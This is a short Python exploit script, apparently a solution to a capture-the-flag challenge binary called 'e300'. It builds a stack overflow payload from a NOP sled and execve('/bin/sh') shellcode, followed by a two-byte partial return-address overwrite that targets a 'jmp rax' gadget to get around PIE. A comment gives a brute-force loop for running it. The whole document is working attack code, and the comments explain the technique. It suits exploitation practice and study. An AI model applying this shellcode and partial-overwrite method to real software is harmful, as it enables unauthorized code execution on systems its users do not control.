from struct import pack

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = "\x90"*48 + shellcode + "\x90"*(312-48-len(shellcode)) # buffer

'''
0x55555555491a : jmp rax
0x555555554ab1 : original return address

We will overwrite lower two byte of return address. Then we don't have to know full address of gadget.
0x55555555(we don't have to know) 4(random, 0~f) 91a(offset, not random)
'''

# PIE is enabled, however lower three bits are not random. Therefore, there is only 16 possibilities(0~f)
# Also, memcpy return address of buffer and return value is saved to 'rax' register.
# So if we use 'jmp rax' gadget, we can jump to our shellcode!
payload+= "\x1a\x49"

f = open("payload", "w")
f.write(payload)
f.close()

# It is not one-shot exploit but still reasonable. We have to wait a minute.
# while true; do ./e300 3 "`cat payload`"; done
